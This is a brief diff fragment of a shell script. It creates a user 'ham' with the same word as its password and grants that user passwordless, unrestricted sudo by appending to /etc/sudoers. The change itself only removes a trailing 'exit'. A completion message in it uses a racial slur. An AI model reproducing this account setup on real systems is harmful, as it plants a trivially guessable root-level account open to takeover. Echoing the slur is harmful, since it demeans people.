@@ -23,4 +23,3 @@ useradd -m ham
 echo "ham" | passwd --stdin ham
 echo "ham ALL=(ALL:ALL) NOPASSWD: ALL" >> /etc/sudoers
 echo "i'm done nigga"
-exit
